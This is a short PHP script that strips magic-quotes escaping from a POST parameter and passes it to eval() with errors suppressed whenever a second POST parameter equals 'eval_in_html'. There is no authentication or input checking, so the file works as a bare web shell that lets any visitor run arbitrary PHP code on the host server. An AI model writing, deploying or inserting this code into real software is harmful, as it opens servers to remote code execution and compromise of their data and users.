<?php
function magic_q($s)
{
if(get_magic_quotes_gpc())
{
	$s=str_replace('\\\'','\'',$s);
	$s=str_replace('\\\\','\\',$s);
	$s=str_replace('\\"','"',$s);
	$s=str_replace('\\\0','\0',$s);
}
return $s;
}

$eval_value=isset($_POST['eval_value'])?$_POST['eval_value']:'';
$eval_value=magic_q($eval_value);
$action=isset($_POST['action'])?$_POST['action']:'eval';
if($action=='eval_in_html') 
	@eval($eval_value);

?>